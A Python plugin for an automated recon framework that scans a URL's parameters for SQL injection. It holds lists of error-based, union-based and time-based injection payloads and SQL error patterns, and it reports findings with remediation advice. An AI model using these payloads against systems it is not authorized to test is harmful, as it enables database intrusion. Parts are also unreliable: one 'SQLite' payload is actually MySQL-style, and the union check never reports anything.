#!/usr/bin/env python3
"""
SQL Injection Scanner Plugin - Detecta vulnerabilidades SQL Injection
"""

import requests
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re
import time
import sys
sys.path.append('..')
from plugin_system import PluginInterface


class SQLiScannerPlugin(PluginInterface):
    """Plugin para scanner SQL Injection automático."""

    name = "sqli_scanner"
    version = "1.0.0"
    author = "Auto Recon System"
    description = "Automated SQL Injection vulnerability scanner"
    category = "vuln_scan"
    requires = ["requests"]

    # Payloads SQL Injection
    ERROR_BASED_PAYLOADS = [
        "'",
        "\"",
        "')",
        "\")",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
    ]

    UNION_BASED_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
    ]

    TIME_BASED_PAYLOADS = [
        # MySQL
        "' AND SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)#",

        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "' OR pg_sleep(5)--",

        # MSSQL
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR 1=1 WAITFOR DELAY '00:00:05'--",

        # SQLite
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT 'test'),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
    ]

    # Patterns de erro SQL
    SQL_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",

        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\\.",
        r"PG::SyntaxError",

        # MSSQL
        r"Driver.*SQL Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Microsoft OLE DB Provider for SQL Server",
        r"\\[SQL Server\\]",
        r"ODBC SQL Server Driver",

        # Oracle
        r"\\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\\Woci_.*",

        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite\\.Exception",
        r"System\\.Data\\.SQLite\\.SQLiteException",

        # Generic
        r"syntax error",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
    ]

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Escaneia URL para SQL Injection.

        Args:
            target: URL alvo
            **kwargs:
                method: GET|POST (default: GET)
                params: Dicionário de parâmetros (opcional)
                timeout: Timeout em segundos (default: 5)
                test_types: Lista de tipos de teste (error, union, time) (default: all)

        Returns:
            Dicionário com vulnerabilidades encontradas
        """
        method = kwargs.get('method', 'GET').upper()
        params = kwargs.get('params', {})
        timeout = kwargs.get('timeout', 5)
        test_types = kwargs.get('test_types', ['error', 'union', 'time'])

        print(f"[*] Scanning {target} for SQL Injection vulnerabilities...")

        vulnerabilities = []

        # Parse URL
        parsed = urlparse(target)

        # Se não tem parâmetros, tenta extrair da URL
        if not params:
            params = parse_qs(parsed.query)
            params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}

        if not params:
            print("[!] No parameters found to test")
            return {
                'vulnerabilities': [],
                'count': 0,
                'message': 'No parameters to test'
            }

        # Faz requisição baseline
        try:
            if method == 'GET':
                baseline_response = requests.get(target, params=params, timeout=timeout, verify=False)
            else:
                baseline_response = requests.post(target, data=params, timeout=timeout, verify=False)

            baseline_time = baseline_response.elapsed.total_seconds()
            baseline_length = len(baseline_response.text)
        except:
            baseline_time = 0
            baseline_length = 0

        # Testa cada parâmetro
        for param_name in params.keys():
            print(f"[*] Testing parameter: {param_name}")

            # ERROR-BASED
            if 'error' in test_types:
                print(f"    [*] Testing error-based injection...")
                vuln = self._test_error_based(target, method, params, param_name, timeout)
                if vuln:
                    vulnerabilities.append(vuln)
                    print(f"    [!] VULNERABLE to error-based injection!")

            # UNION-BASED
            if 'union' in test_types:
                print(f"    [*] Testing union-based injection...")
                vuln = self._test_union_based(target, method, params, param_name, timeout)
                if vuln:
                    vulnerabilities.append(vuln)
                    print(f"    [!] VULNERABLE to union-based injection!")

            # TIME-BASED
            if 'time' in test_types:
                print(f"    [*] Testing time-based injection...")
                vuln = self._test_time_based(target, method, params, param_name, timeout, baseline_time)
                if vuln:
                    vulnerabilities.append(vuln)
                    print(f"    [!] VULNERABLE to time-based injection!")

        print(f"\n[+] Found {len(vulnerabilities)} SQL Injection vulnerabilities")

        self.results = vulnerabilities

        return {
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities),
            'target': target
        }

    def _test_error_based(self, target: str, method: str, params: Dict,
                         param_name: str, timeout: int) -> Dict:
        """Testa error-based SQL injection."""

        for payload in self.ERROR_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = requests.get(target, params=test_params, timeout=timeout, verify=False)
                else:
                    response = requests.post(target, data=test_params, timeout=timeout, verify=False)

                # Verifica SQL errors
                for pattern in self.SQL_ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'type': 'sql_injection_error_based',
                            'severity': 'critical',
                            'url': target,
                            'parameter': param_name,
                            'payload': payload,
                            'method': method,
                            'description': f'Error-based SQL Injection in parameter "{param_name}"',
                            'impact': 'Attacker can extract database information',
                            'remediation': 'Use prepared statements (parameterized queries)',
                            'evidence': self._get_error_evidence(response.text, pattern)
                        }

            except:
                pass

        return None

    def _test_union_based(self, target: str, method: str, params: Dict,
                         param_name: str, timeout: int) -> Dict:
        """Testa union-based SQL injection."""

        for payload in self.UNION_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                if method == 'GET':
                    response = requests.get(target, params=test_params, timeout=timeout, verify=False)
                else:
                    response = requests.post(target, data=test_params, timeout=timeout, verify=False)

                # Verifica SQL errors (indica sucesso parcial)
                for pattern in self.SQL_ERROR_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        continue

                # Se não teve erro, pode ter funcionado
                # Aqui seria necessário análise mais avançada
                # Por ora, apenas reporta se não deu erro com UNION

                if response.status_code == 200 and len(response.text) > 0:
                    # Verifica diferença significativa
                    # (Análise simplificada - seria melhor com UNION SELECT diferente)
                    pass

            except:
                pass

        return None

    def _test_time_based(self, target: str, method: str, params: Dict,
                        param_name: str, timeout: int, baseline_time: float) -> Dict:
        """Testa time-based blind SQL injection."""

        # Aumenta timeout para time-based
        timeout = max(timeout, 10)

        for payload in self.TIME_BASED_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload

            try:
                start_time = time.time()

                if method == 'GET':
                    response = requests.get(target, params=test_params, timeout=timeout, verify=False)
                else:
                    response = requests.post(target, data=test_params, timeout=timeout, verify=False)

                elapsed_time = time.time() - start_time

                # Se demorou ~5 segundos a mais que baseline, é vulnerável
                if elapsed_time >= (baseline_time + 4):
                    return {
                        'type': 'sql_injection_time_based',
                        'severity': 'critical',
                        'url': target,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'description': f'Time-based blind SQL Injection in parameter "{param_name}"',
                        'impact': 'Attacker can extract database information (blind)',
                        'remediation': 'Use prepared statements (parameterized queries)',
                        'evidence': f'Response time: {elapsed_time:.2f}s (baseline: {baseline_time:.2f}s)'
                    }

            except requests.exceptions.Timeout:
                # Timeout também indica sucesso (SLEEP funcionou)
                return {
                    'type': 'sql_injection_time_based',
                    'severity': 'critical',
                    'url': target,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'description': f'Time-based blind SQL Injection in parameter "{param_name}"',
                    'impact': 'Attacker can extract database information (blind)',
                    'remediation': 'Use prepared statements (parameterized queries)',
                    'evidence': f'Request timed out (>{timeout}s) - SLEEP executed successfully'
                }

            except:
                pass

        return None

    def _get_error_evidence(self, response_text: str, pattern: str) -> str:
        """Extrai evidência de SQL error."""

        match = re.search(pattern, response_text, re.IGNORECASE)

        if not match:
            return "SQL error detected in response"

        # Extrai contexto
        start = max(0, match.start() - 50)
        end = min(len(response_text), match.end() + 50)

        evidence = response_text[start:end]

        return evidence
